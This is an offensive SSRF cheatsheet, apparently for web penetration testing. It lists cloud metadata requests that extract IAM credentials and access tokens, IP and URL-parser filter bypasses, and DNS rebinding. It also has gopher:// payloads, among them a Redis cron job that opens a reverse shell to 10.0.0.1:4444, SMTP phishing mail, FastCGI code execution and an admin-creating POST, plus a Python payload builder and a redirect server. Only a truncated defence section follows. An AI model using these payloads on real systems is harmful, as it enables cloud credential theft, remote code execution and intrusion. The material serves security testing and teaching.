---
title: "SSRF - Metadata Endpoints, IP Obfuscation and gopher:// Construction"
category: web
subcategory: ssrf
type: cheatsheet
tags: [ssrf, server-side-request-forgery, cloud-metadata, imds, imdsv2, gopher, dict, redis, fastcgi, smtp, dns-rebinding, url-parser-confusion, decimal-ip, octal-ip, blind-ssrf, oob, interactsh, burp, gopherus, egress-allowlist]
summary: "Cloud metadata paths and headers for six providers, the IP-obfuscation table with the parser behaviour behind each, protocol reach, and gopher payload construction."
tools: [interactsh, burp, gopherus, curl, ffuf, socat]
source:
  name: "PortSwigger - Server-side request forgery"
  url: "https://portswigger.net/web-security/ssrf"
related: [lfi-wrappers-and-paths, command-injection-payloads, xss-payloads]
---

## Where it lives and how to confirm it

```text
# Parameters and features that fetch a URL for you:
#   url uri link src dest redirect return next data feed host port path callback
#   webhook proxy fetch load image img avatar thumbnail preview site domain page
#   endpoint continue window to out view dir show val reference
#
# Features that fetch without an obvious URL parameter:
#   "import from URL" / "upload by link"        PDF/HTML rendering (wkhtmltopdf, headless chrome)
#   webhook configuration                       XML parsing (XXE -> SSRF)
#   SVG / image processing (ImageMagick, ffmpeg) SSO metadata URL (SAML, OIDC discovery)
#   RSS/feed readers                            "check connectivity" / healthcheck admin pages
#   Open Graph link previews                    file-format converters that follow references
#
# Header-driven SSRF (the app builds a URL from a header it trusts):
#   Host, X-Forwarded-Host, X-Forwarded-For, X-Original-URL, X-Rewrite-URL,
#   Referer, X-Forwarded-Server, Forwarded, True-Client-IP
```

```bash
# 1. OOB confirmation -- always the first test, works even when nothing is rendered.
#    A DNS lookup alone proves the server parsed and resolved your hostname.
curl 'http://t/fetch?url=http://x.oast.fun/probe'
# then check interactsh: an HTTP hit = full SSRF; a DNS hit only = the resolver ran
# but egress HTTP is blocked (still exploitable against internal hosts).

# 2. does it reach the loopback / the internal network?
curl 'http://t/fetch?url=http://127.0.0.1/'
curl 'http://t/fetch?url=http://localhost/'
curl 'http://t/fetch?url=http://[::1]/'
curl 'http://t/fetch?url=http://0.0.0.0/'          # 0.0.0.0 routes to localhost on Linux

# 3. is it blind or does it echo the body? compare the response to a known page
curl 'http://t/fetch?url=http://x.oast.fun/marker'   # look for "marker" in the reply

# 4. internal port scan via response-time or status-code differentials:
#    a closed port returns fast (connection refused), a filtered port hangs until
#    timeout, an open port returns a body or a protocol error. Three distinguishable
#    outcomes = a port oracle.
for p in 22 80 443 3000 3306 5000 5432 6379 8000 8080 8443 9200 11211 27017; do
  printf '%s ' "$p"
  curl -s -o /dev/null -w '%{http_code} %{time_total}\n' "http://t/fetch?url=http://127.0.0.1:$p/"
done

# 5. sweep the internal /16 for live hosts using the same oracle
ffuf -u 'http://t/fetch?url=http://10.0.FUZZ.1/' -w <(seq 0 255) -fs 0 -t 40
```

## Cloud metadata endpoints

```bash
# === AWS EC2 -- IMDSv1 (no headers, no token: a plain GET is enough) ===
# The link-local address 169.254.169.254 is answered by the hypervisor, so it is
# reachable from every instance and is never routed off the host.
curl http://169.254.169.254/latest/meta-data/                     # index of available keys
curl http://169.254.169.254/latest/meta-data/ami-id
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/local-ipv4
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/security-groups
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/            # MACs
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
curl http://169.254.169.254/latest/dynamic/instance-identity/document            # region, acct id
curl http://169.254.169.254/latest/user-data                                     # THE prize:
# user-data is the boot script. It frequently contains bootstrap secrets, DB
# passwords, private repo tokens and deploy keys in plaintext.

# the IAM role credentials -- the real objective. Two requests: list the role, then
# fetch its temporary credentials.
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# returns JSON: AccessKeyId (ASIA...), SecretAccessKey, Token, Expiration.
# Because it is an ASIA key you MUST also export the session token:
#   export AWS_ACCESS_KEY_ID=ASIA...; export AWS_SECRET_ACCESS_KEY=...;
#   export AWS_SESSION_TOKEN=...; aws sts get-caller-identity

# === AWS EC2 -- IMDSv2 (session-oriented; the default on newer AMIs) ===
# IMDSv2 requires a PUT to mint a token, then that token in a header on every GET.
# This is deliberately hostile to SSRF: most SSRF primitives can only issue GETs and
# cannot set arbitrary request headers. You need BOTH capabilities to defeat it.
TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' \
        -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2 also sets a hop limit (default 1) on its responses, so a response cannot
# traverse a container's NAT hop -- another reason it blocks containerised SSRF.
#
# When does SSRF still beat IMDSv2?
#   - the sink lets you choose the METHOD (some "webhook test" features do)
#   - the sink lets you add headers (a proxy feature, or CRLF injection in the URL)
#   - gopher:// (you write the raw HTTP request yourself, method and headers included)
#   - the app is a full HTTP proxy that forwards your method and headers verbatim

# === AWS ECS / Fargate task role ===
# Container credentials live on 169.254.170.2 and the path arrives in an env var.
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl http://169.254.170.2/v2/credentials/<uuid>
curl http://169.254.170.2/v2/metadata

# === AWS Lambda ===
# Credentials are in environment variables, not on a metadata IP -- so the SSRF has
# to become a file/env read instead (/proc/self/environ).
curl "$AWS_LAMBDA_RUNTIME_API/2018-06-01/runtime/invocation/next"

# === Google Cloud (GCE / GKE / Cloud Run) ===
# Every request MUST carry Metadata-Flavor: Google. This header requirement exists
# precisely to block simple SSRF, because a browser or a naive fetcher will not send it.
curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/
curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/
# recursive=true returns the ENTIRE tree in one JSON response -- one request, everything
curl -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json'
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/          # index
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env  # GKE bootstrap creds
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
# the OAuth2 access token -- the objective. Use it as: Authorization: Bearer <token>
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# the identity token (a signed JWT) -- for calling other GCP services that accept OIDC
curl -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com'
curl -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
# check what the token can actually do before spending requests:
curl 'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<token>'

# === Azure (VM / App Service / AKS) ===
# Requires  Metadata: true  and an explicit api-version query parameter.
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=text'
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01'
# custom data / user data -- base64-encoded provisioning payload
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text'
# the managed-identity access token -- the objective. resource= names the audience.
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
curl -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com'
# Azure App Service / Functions use a different endpoint, taken from env vars, and
# require the X-IDENTITY-HEADER secret rather than Metadata: true
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"

# === Alibaba Cloud ===
# Same shape as AWS IMDSv1 but on 100.100.100.200 -- note this is NOT a link-local
# address, so egress filters written only for 169.254.0.0/16 miss it entirely.
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/image-id
curl http://100.100.100.200/latest/meta-data/region-id
curl http://100.100.100.200/latest/user-data
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
# hardened mode (Alibaba's IMDSv2 equivalent) uses the same PUT-for-token dance:
TOKEN=$(curl -X PUT 'http://100.100.100.200/latest/api/token' \
        -H 'X-aliyun-ecs-metadata-token-ttl-seconds: 21600')
curl -H "X-aliyun-ecs-metadata-token: $TOKEN" http://100.100.100.200/latest/meta-data/

# === DigitalOcean ===
# No authentication header at all -- a plain GET returns everything.
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1.json             # everything, one JSON blob
curl http://169.254.169.254/metadata/v1/id
curl http://169.254.169.254/metadata/v1/hostname
curl http://169.254.169.254/metadata/v1/region
curl http://169.254.169.254/metadata/v1/user-data        # cloud-init script, often has secrets
curl http://169.254.169.254/metadata/v1/vendor-data
curl http://169.254.169.254/metadata/v1/public-keys
curl http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address

# === Oracle Cloud (OCI) ===
# v1 needs no header; v2 requires  Authorization: Bearer Oracle  (a fixed literal
# string, not a secret -- it exists purely so a header-less SSRF cannot reach v2).
curl http://169.254.169.254/opc/v1/instance/
curl http://169.254.169.254/opc/v1/instance/metadata/
curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/
curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/metadata/
curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/identity/cert.pem
curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/identity/key.pem
curl -H 'Authorization: Bearer Oracle' http://169.254.169.254/opc/v2/instance/metadata/user_data

# === Kubernetes (from inside a pod) ===
# Not a metadata service, but the same class of target and usually reachable.
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
curl http://127.0.0.1:10255/pods                         # kubelet read-only port (legacy)
curl -k https://127.0.0.1:10250/pods                      # kubelet API, sometimes anon-auth
```

```text
# Other internal targets worth a request once SSRF is confirmed:
#   127.0.0.1:6379   Redis           -> gopher RCE (see below)
#   127.0.0.1:11211  Memcached       -> gopher cache poisoning / session forgery
#   127.0.0.1:9200   Elasticsearch   -> /_cat/indices, /_search, full data read over plain GET
#   127.0.0.1:5984   CouchDB         -> /_all_dbs, /_config (RCE via os_daemons on old versions)
#   127.0.0.1:2375   Docker API      -> /containers/json, then container create = host RCE
#   127.0.0.1:8500   Consul          -> /v1/kv/?recurse, /v1/agent/service/register (RCE via checks)
#   127.0.0.1:2379   etcd            -> /v2/keys/?recursive=true, cluster secrets
#   127.0.0.1:9000   FastCGI/php-fpm -> gopher RCE (see below)
#   127.0.0.1:8080   internal admin  -> Jenkins /script, Actuator /actuator/env, Spring /heapdump
#   127.0.0.1:15672  RabbitMQ mgmt   -> default guest:guest
#   127.0.0.1:27017  MongoDB         -> unauthenticated by default in old builds
#   127.0.0.1:25     SMTP            -> gopher mail relay (see below)
#   127.0.0.1:3128   Squid proxy     -> a pivot to the whole internal network
```

## IP and hostname obfuscation

```text
# Every row is one parser disagreeing with another. The BLOCKLIST parses the string
# one way (usually a regex or a naive split on '.'), and the HTTP CLIENT / resolver
# parses it a different way. The request goes where the client thinks, not where the
# filter thought.

--- numeric forms of 127.0.0.1 ---
127.0.0.1               the literal
2130706433              DECIMAL. inet_addr()/inet_aton() accept a single 32-bit integer
                        as a whole address. A filter matching "127." sees no dots.
0x7f000001              HEX, single 32-bit value. inet_aton accepts 0x-prefixed.
0x7f.0x0.0x0.0x1        HEX per octet -- each part parsed independently
017700000001            OCTAL, single value. A LEADING ZERO means base 8 to inet_aton,
                        but modern Python/Go/Rust parsers REJECT leading zeros -- so
                        this succeeds or fails depending on which library fetches it.
0177.0.0.1              OCTAL per octet
0177.0000.0000.0001     zero-padded octal
127.1                   SHORT FORM: with 2 parts, inet_aton treats the last as a
                        24-bit value -> 127.0.0.1
127.0.1                 3-part form: the last part is 16 bits
1.1                     -> 1.0.0.1, same rule
2130706433.             trailing dot, still parsed
0                       0.0.0.0, which the kernel routes to localhost
0.0.0.0                 binds/connects to localhost on Linux
[::]                    IPv6 any-address -> localhost
[::1]                   IPv6 loopback
[0:0:0:0:0:0:0:1]       expanded IPv6 loopback
[::ffff:127.0.0.1]      IPv4-MAPPED IPv6. The socket layer maps it back to IPv4, but a
                        v4-shaped regex never matches the v6 text form.
[::ffff:7f00:1]         the same address written in hex
[0:0:0:0:0:ffff:7f00:1]
[::ffff:0:127.0.0.1]    IPv4-translated
2130706433 + %0a        trailing whitespace/newline that some parsers strip
①②⑦.⓪.⓪.①            enclosed-alphanumeric digits normalised to ASCII by NFKC

--- the same for 169.254.169.254 (AWS/Azure/DO metadata) ---
2852039166              decimal
0xA9FEA9FE              hex, single value
0xa9.0xfe.0xa9.0xfe     hex per octet
0251.0376.0251.0376     octal per octet
[::ffff:169.254.169.254]
[::ffff:a9fe:a9fe]
169.254.169.254.nip.io  a public DNS wildcard that resolves the embedded IP
metadata.google.internal  a real internal hostname -- no IP in the string at all
instance-data           an AWS-internal alias for the metadata host
metadata                same idea on several providers

--- hostname tricks ---
localtest.me            public DNS pointing at 127.0.0.1
127.0.0.1.nip.io        nip.io echoes any embedded IP back as an A record
spoofed.burpcollaborator.net    a hostname you control, resolving wherever you want
0x7f000001.nip.io
subdomain.attacker.tld  with a 1-second TTL A record -- the basis for rebinding

--- URL PARSER CONFUSION: two components read the URL differently ---
http://expected.com@127.0.0.1/          '@' separates userinfo from host. A filter that
                                        checks "starts with http://expected.com" passes;
                                        the client connects to 127.0.0.1.
http://127.0.0.1#@expected.com/         '#' starts the fragment, so the host is 127.0.0.1;
                                        a filter that looks for expected.com anywhere passes.
http://expected.com#@127.0.0.1/         the inverse -- which one wins depends on whether the
                                        checker strips the fragment before parsing.
http://expected.com%[email protected]/     %40 is an encoded @; whether it decodes before or
                                        after host extraction decides the target.
http://127.0.0.1%09.expected.com/       a tab inside the host: some parsers strip it, some
                                        truncate the host there.
http://127.0.0.1%0d%0a.expected.com/    CRLF in the host -- truncation or header injection
http://expected.com:[email protected]/    userinfo with a password part
http://127.0.0.1:80\@expected.com/      backslash: WHATWG URL treats \ as /, RFC 3986 does not
http://expected.com\\@127.0.0.1/
http://[email protected]@127.0.0.1/     multiple @: the LAST one wins per WHATWG, the
                                        first one wins in some older parsers
http://foo@evil:80@expected.com/
http:///127.0.0.1                       three slashes: an empty authority; some clients then
                                        take the first path segment as the host
http:/\/\127.0.0.1                      mixed slashes normalised by WHATWG
http://127.0.0.1./                      trailing dot on the host = same resolution, different string
http://127。0。0。1/                    ideographic full stop U+3002; the IDNA/URL host parser
                                        maps it to '.', a byte-level regex does not
http://ⓔxample.com/                     unicode that NFKC-normalises into ASCII after the check
http://expected.com.attacker.tld/       suffix confusion: passes an "endswith" check written
                                        without the leading dot
http://attacker.tld/?x=expected.com     passes a "contains" check
http://expectedXcom/                    passes an unescaped-dot regex  expected.com

--- redirect-based bypass (the filter validates, then follows) ---
# The application validates the URL you gave, fetches it, and FOLLOWS the 302 to an
# address it never validated. Host an endpoint that redirects:
#   HTTP/1.1 302 Found
#   Location: http://169.254.169.254/latest/meta-data/
# Test both 30x and the meta-refresh / JS variants, and try a redirect chain, since
# some validators re-check only the first hop.
http://attacker.tld/redirect?to=http://169.254.169.254/latest/meta-data/

--- DNS REBINDING (beats a "resolve then check" validator) ---
# The validator resolves your hostname (gets a safe public IP), approves it, and then
# the HTTP client resolves it AGAIN a moment later -- and gets 169.254.169.254.
# The window between the two lookups is the vulnerability (a TOCTOU on DNS).
# Serve an A record with TTL 0 that alternates between a public IP and the target:
#   rbndr.us:        http://7f000001.c0a80001.rbndr.us/     (alternates 127.0.0.1 / 192.168.0.1)
#   singularity:     https://github.com/nccgroup/singularity
# Multi-answer variant: return BOTH IPs in one response; the validator checks the
# first, the client may connect to the second.
```

## Protocol reach

```text
# What the fetcher's library supports decides what you can reach. Test each scheme
# and watch for a different error message -- that alone tells you it is supported.

http://    / https://   ordinary web requests. Reaches any HTTP service, including
                        internal admin panels and every metadata endpoint above.
                        https:// to an internal host usually fails on the certificate,
                        so prefer http:// for internal targets.
file://                 LOCAL FILE READ. Turns SSRF into LFI:
                        file:///etc/passwd, file:///proc/self/environ,
                        file:///var/www/html/config.php, file:///C:/Windows/win.ini
                        Note file://host/path is also valid -> SMB on Windows.
gopher://               RAW TCP with full control of the bytes after the first line.
                        The single most powerful scheme: it turns SSRF into
                        "send arbitrary bytes to any internal TCP port". See below.
                        Removed from libcurl by default since 7.87 (--proto +gopher
                        or a rebuild re-enables it); PHP's curl wrapper often still has it.
dict://                 sends "<COMMAND> <ARG>\r\n" to the port. Gives you ONE line of
                        input per connection -- enough for a Redis or Memcached command.
                        dict://127.0.0.1:6379/info
                        dict://127.0.0.1:11211/stats
ftp:// / ftps://        FTP fetch; also an OOB channel. ftp://attacker.tld/ makes the
                        server connect out and can leak internal IPs in PASV mode.
ldap:// / ldaps://      LDAP query. In Java, a JNDI lookup on an attacker LDAP server
                        is the Log4Shell primitive -> deserialisation / RCE.
tftp://                 UDP file transfer -- reaches services a TCP-only filter ignores.
sftp:// / scp://        curl-supported SSH transports; a port oracle at minimum.
smb:// / \\host\share   Windows: triggers an SMB auth attempt, leaking the NetNTLM hash
                        of the service account to your responder.
netdoc://               Java-only alias for file:// -- bypasses a file:// blacklist.
jar:                    Java: jar:http://attacker.tld/x.zip!/f -- downloads and unpacks
                        to a temp file; useful for RCE chains.
php://, data://, expect:// , zip://, phar://
                        only when the sink is a PHP stream function rather than an HTTP
                        client -- see the LFI cheatsheet for these.
mailto:                 harmless alone, but proves the URL is handed to a generic opener.
```

```bash
# quick scheme sweep -- different errors mean different handlers
for s in http https file gopher dict ftp ldap tftp netdoc jar sftp; do
  printf '%-8s ' "$s"
  curl -s "http://t/fetch?url=$s://127.0.0.1/etc/passwd" | head -c 120; echo
done
```

## gopher:// payload construction

```text
# WHY gopher is the crown jewel:
# The gopher protocol says "connect to host:port, send the selector string, read
# until close". The URL is  gopher://host:port/<TYPE><selector>
#   - <TYPE> is a single character the client CONSUMES and does not transmit. Use _
#     (any char works) as a throwaway so your real payload starts at byte 0.
#   - everything after it is sent RAW over the TCP connection.
# So gopher gives you a write-only raw TCP socket to any internal port, with full
# control over every byte -- including CRLFs. Any plaintext protocol that does not
# need to read a server banner before you speak is exploitable.
#
# CONSTRUCTION RULES (this is where people get it wrong):
#   1. Write the raw protocol bytes exactly as you would type them into netcat.
#   2. Replace every CR with %0d and every LF with %0a. A bare %0a is NOT enough for
#      HTTP, Redis or SMTP -- they all require CRLF.
#   3. URL-encode anything else the URL parser would eat: %25 for %, %26 for &,
#      %23 for #, %3f for ?, %20 for space (a raw space truncates the URL).
#   4. Because the value usually sits in a query parameter, DOUBLE-ENCODE the whole
#      thing: %0d%0a becomes %250d%250a. The server decodes once when parsing your
#      request, and the gopher client sees the single-encoded form.
#   5. gopher is fire-and-forget: you cannot read a reply and adapt. Every byte must
#      be decided in advance, so protocols with a mandatory server-first handshake
#      (SSH, TLS, MySQL) are out of reach.
#   6. Terminate with the protocol's own end marker (a blank line for HTTP, QUIT for
#      SMTP) or the service may wait forever and your request times out.
```

```bash
# --- WORKED EXAMPLE 1: Redis -> write a cron job -> RCE ---
# Redis speaks a newline-delimited text protocol and accepts inline commands, so
# every line you send is executed in order. CONFIG SET lets you choose where Redis
# writes its dump file; SAVE then writes it. Point it at a cron directory and the
# "database" you saved is parsed by cron as a crontab.
#
# The raw session, as you would type it into  nc 127.0.0.1 6379 :
#
#   flushall
#   set 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n"
#   config set dir /var/spool/cron/crontabs
#   config set dbfilename root
#   save
#   quit
#
# The leading and trailing newlines around the payload matter: the RDB file has
# binary junk around your string, and cron skips malformed lines but accepts the
# clean one in the middle.
#
# Now encode it. Each line ends with CRLF -> %0d%0a, spaces -> %20 :
curl 'http://t/fetch?url=gopher://127.0.0.1:6379/_flushall%0d%0aset%201%20%22%5Cn%5Cn*/1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/4444%200%3E%261%5Cn%5Cn%22%0d%0aconfig%20set%20dir%20/var/spool/cron/crontabs%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0aquit%0d%0a'

# double-encoded form, for when the value is a query parameter that gets decoded once
curl 'http://t/fetch?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_flushall%250d%250aconfig%2520set%2520dir%2520%2Fvar%2Fspool%2Fcron%250d%250asave%250d%250aquit%250d%250a'

# other Redis write targets, same technique, different dir/dbfilename:
#   /var/spool/cron/crontabs/root   (Debian cron)   /var/spool/cron/root (RHEL)
#   /root/.ssh/                     dbfilename authorized_keys  -> SSH key injection
#   /var/www/html/                  dbfilename shell.php        -> webshell
# Redis 4/5 also allow MODULE LOAD of an .so you first wrote to disk -> direct RCE.

# --- WORKED EXAMPLE 2: SMTP -> send mail as the internal server ---
# SMTP is server-first (it sends a 220 banner), but it TOLERATES a client that talks
# immediately: the commands sit in the socket buffer and are processed in order after
# the banner. That tolerance is what makes blind gopher work here.
#
# The raw session:
#   HELO attacker.tld
#   MAIL FROM:<admin@target.tld>
#   RCPT TO:<victim@target.tld>
#   DATA
#   Subject: password reset
#
#   click here: http://attacker.tld/
#   .
#   QUIT
#
# The lone "." on its own line ends DATA -- it must be preceded and followed by CRLF.
curl 'http://t/fetch?url=gopher://127.0.0.1:25/_HELO%20attacker.tld%0d%0aMAIL%20FROM%3A%3Cadmin@target.tld%3E%0d%0aRCPT%20TO%3A%3Cvictim@target.tld%3E%0d%0aDATA%0d%0aSubject%3A%20password%20reset%0d%0a%0d%0aclick%20here%3A%20http%3A//attacker.tld/%0d%0a.%0d%0aQUIT%0d%0a'

# --- WORKED EXAMPLE 3: FastCGI (php-fpm on 127.0.0.1:9000) -> RCE ---
# FastCGI is a BINARY protocol: records with a type, a request id and a length,
# followed by name/value pairs. You cannot hand-write it reliably, and that is fine --
# the construction is mechanical, so generate it.
#
# The mechanism: php-fpm trusts the SCRIPT_FILENAME it is given and will execute any
# existing .php path. Two extra params turn that into arbitrary code:
#   PHP_VALUE: auto_prepend_file = php://input   -> php-fpm reads the request BODY as
#              a PHP file and includes it before the script
#   PHP_ADMIN_VALUE: allow_url_include = 1       -> makes php://input usable there
# Your PHP source then goes in the FCGI_STDIN records. SCRIPT_FILENAME only has to
# point at a .php file that EXISTS (/usr/share/php/PEAR.php, /var/www/html/index.php).
#
# Generate the URL rather than typing it:
git clone https://github.com/tarunkant/Gopherus
python3 Gopherus/gopherus.py --exploit fastcgi
#   it asks for the path of a known .php file and the command, and prints a
#   gopher://127.0.0.1:9000/_%01%01... string ready to paste
python3 Gopherus/gopherus.py --exploit redis
python3 Gopherus/gopherus.py --exploit mysql
python3 Gopherus/gopherus.py --exploit smtp
python3 Gopherus/gopherus.py --exploit zabbix
python3 Gopherus/gopherus.py --exploit pymemcache
python3 Gopherus/gopherus.py --exploit rbmemcache
python3 Gopherus/gopherus.py --exploit phpmemcache
python3 Gopherus/gopherus.py --exploit dmpmemcache

# --- WORKED EXAMPLE 4: a plain HTTP POST to an internal API ---
# gopher is also how you turn a GET-only SSRF into a POST, or add headers -- which is
# exactly what IMDSv2 and GCP's Metadata-Flavor requirement demand.
#   POST /admin/user HTTP/1.1
#   Host: 127.0.0.1
#   Content-Type: application/json
#   Content-Length: 27
#
#   {"user":"x","role":"admin"}
curl 'http://t/fetch?url=gopher://127.0.0.1:80/_POST%20/admin/user%20HTTP/1.1%0d%0aHost%3A%20127.0.0.1%0d%0aContent-Type%3A%20application/json%0d%0aContent-Length%3A%2027%0d%0a%0d%0a%7B%22user%22%3A%22x%22%2C%22role%22%3A%22admin%22%7D'
# Content-Length must be EXACT: too small and the body is truncated, too large and
# the server blocks waiting for bytes that never arrive.

# --- and the same shape against GCP metadata, adding the required header ---
curl 'http://t/fetch?url=gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0d%0aHost%3A%20metadata.google.internal%0d%0aMetadata-Flavor%3A%20Google%0d%0a%0d%0a'
```

```python
#!/usr/bin/env python3
"""Build a gopher:// URL from a raw payload. Handles the CRLF and double-encoding
rules that trip everyone up.

Usage:
    python3 gopherify.py redis 127.0.0.1 6379
    python3 gopherify.py http  127.0.0.1 80
"""
import sys
from urllib.parse import quote

REDIS = (
    "flushall\r\n"
    'set 1 "\\n\\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\n\\n"\r\n'
    "config set dir /var/spool/cron/crontabs\r\n"
    "config set dbfilename root\r\n"
    "save\r\n"
    "quit\r\n"
)

HTTP_BODY = '{"user":"x","role":"admin"}'
HTTP = (
    "POST /admin/user HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(HTTP_BODY)}\r\n"
    "\r\n"
    f"{HTTP_BODY}"
)

PAYLOADS = {"redis": REDIS, "http": HTTP}


def gopherify(payload: str, host: str, port: int, double: bool = False) -> str:
    # safe="" forces EVERY non-alphanumeric byte to be percent-encoded, including
    # CR, LF, space, ? & # % -- which is exactly what the URL parser must not eat.
    enc = quote(payload, safe="")
    if double:
        enc = quote(enc, safe="")          # survives one server-side decode
    # "_" is the gopher item-type char: the client eats it, the server never sees it.
    return f"gopher://{host}:{port}/_{enc}"


if __name__ == "__main__":
    kind = sys.argv[1] if len(sys.argv) > 1 else "redis"
    host = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
    port = int(sys.argv[3]) if len(sys.argv) > 3 else (6379 if kind == "redis" else 80)

    payload = PAYLOADS[kind]
    single = gopherify(payload, host, port)
    double = gopherify(payload, host, port, double=True)

    print("single-encoded (paste into a raw request):\n" + single + "\n")
    print("double-encoded (for a query-string parameter):\n" + double + "\n")

    # self-test: the single-encoded form must contain no raw CR/LF/space, and must
    # round-trip back to the original payload.
    from urllib.parse import unquote
    assert "\r" not in single and "\n" not in single and " " not in single
    assert unquote(single.split("/_", 1)[1]) == payload
    assert unquote(unquote(double.split("/_", 1)[1])) == payload
    print("self-test ok")
```

## Out-of-band detection setup

```bash
# 1. interactsh -- DNS + HTTP + SMTP in one, gives you a throwaway subdomain
interactsh-client -v
# it prints something like c9x...oast.fun ; every lookup and request is shown live

# 2. Burp Collaborator: Burp > Collaborator > "Copy to clipboard".
#    Burp also polls automatically and correlates the hit with the request that
#    caused it, which is what you want when fuzzing hundreds of parameters.

# 3. a bare listener when you control a public host
nc -lvnp 80                                  # shows the raw request line and headers
python3 -m http.server 80                    # logs method + path
socat -v TCP-LISTEN:80,fork,reuseaddr STDOUT # prints the full byte stream

# 4. DNS-only listener, for when outbound HTTP is filtered but DNS is not
#    (DNS almost always escapes, because the internal resolver makes the query)
sudo python3 -m dnslib.fixedresolver --port 53 127.0.0.1

# 5. a redirector for the "validate then follow" bypass
cat > redir.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
TARGET = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", TARGET)
        self.end_headers()
    def log_message(self, *a): print(self.address_string(), self.path, self.headers.get("User-Agent"))
HTTPServer(("0.0.0.0", 8080), H).serve_forever()
PY
python3 redir.py

# 6. read the callback's User-Agent -- it names the HTTP library, which tells you
#    which parser quirks and which protocols are available:
#    "python-requests/2.x" -> no gopher, follows redirects by default
#    "curl/8.x"            -> gopher only if compiled in, file:// usually available
#    "Java/1.8"            -> netdoc://, jar:, and LDAP/JNDI are in play
#    "Go-http-client/1.1"  -> strict IP parsing, rejects leading-zero octals
#    "wkhtmltopdf"/"HeadlessChrome" -> a full browser: JS runs, so fetch() to internal
#                                      hosts and <iframe src=file:///etc/passwd> apply
```

## Defence

```text
# SSRF is an ARCHITECTURE bug more than an input bug. Rank the controls accordingly.

# 1. EGRESS ALLOWLIST at the network layer -- the only control that holds when the
#    application-layer validation is bypassed. The service that fetches user URLs gets
#    its own security group / NetworkPolicy / firewall zone that can reach ONLY the
#    hosts it legitimately needs. Deny by default:
#      - RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
#      - loopback: 127.0.0.0/8 and ::1/128
#      - link-local: 169.254.0.0/16 and fe80::/10   (this is the metadata service)
